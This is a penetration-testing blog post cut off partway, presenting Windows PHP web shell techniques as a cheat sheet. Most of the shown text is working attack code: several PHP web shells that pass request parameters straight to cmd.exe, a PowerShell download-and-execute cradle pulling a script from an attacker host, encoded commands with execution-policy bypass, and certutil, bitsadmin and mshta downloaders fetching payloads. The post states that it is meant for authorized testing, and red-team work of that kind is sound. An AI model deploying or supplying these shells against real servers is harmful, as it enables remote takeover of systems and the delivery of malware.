---
title: Windows PHP Web Shell & Reverse Shell Techniques
url: https://www.hackingdream.net/2025/11/windows-php-web-shell-reverse-shell.html
source: Hacking Dream
date: 2025-11-27
fetch_date: 2025-11-28T03:12:28.221148
---

# Windows PHP Web Shell & Reverse Shell Techniques

* [Home](http://www.hackingdream.net)
* [About Author](http://www.hackingdream.net/p/about-author.html)
* [Contact US](http://www.hackingdream.net/p/contact-us.html)

[# ![Hacking Dream](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgI3MZul9awsB7xmLlAs9J9xDOsiYxbMQoa4EQkvg9T9oe4q5zkZRqV0W4UN2KhrQQWPLveTvQ9kkuHu2HfrahqY0Gc53G1cVCwQNY2G3MVkEOJoDvLIK9lFtBUc-HhRciiteWdHYV4SaE/s1600/Size-Modified.png)](https://www.hackingdream.net/)

Main menu

close

* [Home](http://www.hackingdream.net)
* [AI Sec](https://www.hackingdream.net/search/label/AI)
* [AI Pentest](http://www.hackingdream.net/search/label/AI%20Attacks)
* [Cheatsheets](https://www.hackingdream.net/search/label/Cheatsheet)
* [Pentest](https://www.hackingdream.net/search/label/Pentest)
* [\_Active Directory](https://www.hackingdream.net/search/label/Active%20Directory)
* [\_Linux](http://www.hackingdream.net/search/label/Kali%20Linux)
* [\_Wireless](http://www.hackingdream.net/search/label/Wifi%20Hacking)
* [\_Target Hacking](http://www.hackingdream.net/search/label/Target%20Hacking)
* [Purple Team](https://www.hackingdream.net/search/label/Purple%20Team)
* [Bin Exp](https://www.hackingdream.net/search/label/Exploitation)
* How To
* [\_Blogging](http://www.hackingdream.net/search/label/Blogging)
* [\_Solved Problems](http://www.hackingdream.net/search/label/Solved%20Problems)
* [\_Money Making](http://www.hackingdream.net/search/label/Money%20Making)
* [\_Top Ten](http://www.hackingdream.net/search/label/Top%20Ten)
* [\_Gaming](http://www.hackingdream.net/search/label/Games)

### Windows PHP Web Shell & Reverse Shell Techniques

[November 27, 2025](https://www.hackingdream.net/2025/11/windows-php-web-shell-reverse-shell.html "permanent link")

Windows Web Shell & Reverse Shell Techniques: Complete Guide

# Windows Web Shell & Reverse Shell Techniques: Complete Guide

*Updated on November 27, 2025*

**Table of Contents**

* [Core Concept: Windows Command Execution via PHP](#core-concept)
* [Windows Web Shell Techniques (PHP + cmd.exe + PowerShell)](#web-shell-techniques)
* [Windows Reverse Shell Techniques (PHP + cmd.exe + PowerShell)](#reverse-shell-techniques)
* [Windows-Focused Obfuscation Techniques](#obfuscation-techniques)
* [MITRE ATT&CK Mapping (Windows-Specific)](#mitre-mapping)
* [Defensive Takeaways for Windows Environments](#defensive-takeaways)

Windows servers remain a prime target for web shell and reverse shell activity, especially in IIS/PHP environments and legacy stacks still running classic ASP or PHP on Windows. This guide focuses entirely on Windows-specific techniques so you can test your defenses, logging, and EDR visibility in a realistic way. Understanding these **Windows web shell techniques** is crucial for modern red teaming.

All examples are for authorized penetration testing and lab use only.

[![Windows PHP Web Shell & Reverse Shell Techniques](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheZXXYzoJilw2vxFSQJKtqe9o7YCEbPzFI9vViWCwvX4uRtJuGBvlfMZWClTX07ih5B1WlkA6hynJHwTQau9cEewoV1BUEuVySbYyuKA1Ne3nvTvwfANzg0qtilGM3_ul-M_o2GdqruCTbuiwUxlVxmkk-iG-zjLNYBGM12eIhXWg_In5arBi7EWt_JW-Y/w640-h474/Windows-PHP-Web-Shell-&-Reverse-Shell-Techniques.jpg "Windows PHP Web Shell & Reverse Shell Techniques")](https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheZXXYzoJilw2vxFSQJKtqe9o7YCEbPzFI9vViWCwvX4uRtJuGBvlfMZWClTX07ih5B1WlkA6hynJHwTQau9cEewoV1BUEuVySbYyuKA1Ne3nvTvwfANzg0qtilGM3_ul-M_o2GdqruCTbuiwUxlVxmkk-iG-zjLNYBGM12eIhXWg_In5arBi7EWt_JW-Y/s964/Windows-PHP-Web-Shell-%26-Reverse-Shell-Techniques.jpg)

## Core Concept: Windows Command Execution via PHP

On Windows, PHP typically executes commands through `cmd.exe`, either implicitly (via `system()`, `exec()`) or explicitly (`cmd /c <command>`).

Key points:

* Default shell: `cmd.exe`
* Common utilities: `powershell.exe`, `certutil.exe`, `bitsadmin.exe`, `curl.exe`, `mshta.exe`, `rundll32.exe`
* Many defenses: AppLocker, WDAC, AMSI, Defender, EDR tools

When testing, use both:

* Direct command execution: `system("whoami")`
* Wrapped execution: `system("cmd /c whoami")`

Example base snippet:

```
<?php
// Minimal Windows web shell
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    // Explicitly use cmd.exe for Windows
    system("cmd /c " . $cmd);
}
?>
```

Example usage:

* `http://target/shell.php?cmd=whoami`
* `http://target/shell.php?cmd=ipconfig /all`

## Windows Web Shell Techniques (PHP + cmd.exe + PowerShell)

These patterns help you test different code paths, logging behavior, and AV/EDR signatures on Windows.

### 1. Direct Command Execution on Windows

1) system() with cmd.exe

```
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system("cmd /c " . $cmd);
}
?>
```

2) shell\_exec() with cmd.exe

```
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $out = shell_exec("cmd /c " . $cmd);
    echo "<pre>$out</pre>";
}
?>
```

3) exec() with cmd.exe

```
<?php
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = [];
    exec("cmd /c " . $cmd, $output, $code);
    echo "Exit Code: $code\n";
    echo "<pre>" . implode("\n", $output) . "</pre>";
}
?>
```

4) passthru() for streaming output

```
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    passthru("cmd /c " . $cmd);
}
?>
```

5) Backticks on Windows

```
<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    $out = `cmd /c $cmd`;
    echo "<pre>$out</pre>";
}
?>
```

These variants all map to `T1059.003 - Command and Scripting Interpreter: Windows Command Shell`.

### 2. PowerShell-Based Web Shell Patterns

Windows often has PowerShell available by default, and many payloads rely on it.

1) simple PowerShell inline command

```
<?php
if (isset($_GET['ps'])) {
    $ps = $_GET['ps']; // e.g., whoami; dir C:\
    $cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "' . $ps . '"';
    $out = shell_exec($cmd);
    echo "<pre>$out</pre>";
}
?>
```

2) PowerShell download + execute (for stager testing)

Use an HTTP server on your attacker box to host a script `rs.ps1`.

```
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url']; // http://ATTACKER/rs.ps1
    $ps  = "IEX(New-Object Net.WebClient).DownloadString('$url')";
    $cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "' . $ps . '"';
    shell_exec($cmd);
    echo "[+] PowerShell download cradle triggered";
}
?>
```

3) PowerShell encoded command (tests AV/AMSI behavior)

```
<?php
if (isset($_GET['ps'])) {
    $ps   = $_GET['ps']; // raw PowerShell
    $b64  = base64_encode(iconv("UTF-8","UTF-16LE",$ps));
    $cmd  = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $b64";
    $out  = shell_exec($cmd);
    echo "<pre>$out</pre>";
}
?>
```

This is useful to see how well AMSI/EDR handle encoded payloads. For further reading on EDR evasion, check out our guide on advanced evasion techniques.

### 3. Windows Living-Off-The-Land (LOLBins) from PHP

Use Windows-native binaries that often bypass naive allow lists.

1) certutil download test (T1105)

```
<?php
// Test certutil file download
if (isset($_GET['url'])) {
    $url = $_GET['url']; // http://ATTACKER/payload.exe
    $cmd = 'certutil.exe -urlcache -split -f ' . $url . ' C:\\Windows\\Temp\\payload.exe';
    system("cmd /c " . $cmd);
    echo "[+] certutil download attempted";
}
?>
```

2) bitsadmin download

```
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url'];
    $cmd = 'bitsadmin /transfer myJob ' . $url . ' C:\\Windows\\Temp\\payload.exe';
    system("cmd /c " . $cmd);
    echo "[+] bitsadmin job created (if allowed)";
}
?>
```

3) mshta / rundll32 / wmic (for side-channel testing)

Example with mshta:

```
<?php
if (isset($_GET['url'])) {
    $url = $_GET['url']; // malicious HTA URL
    $cmd = 'mshta.exe ' . $url;
    system("cmd /c " . $cmd);
    echo "[+] mshta launched (if not blocked)";
}
?>
```

Use these to see which LOLBins are blocked/logged in your environment.

## Windows Reverse Shell Techniques (P...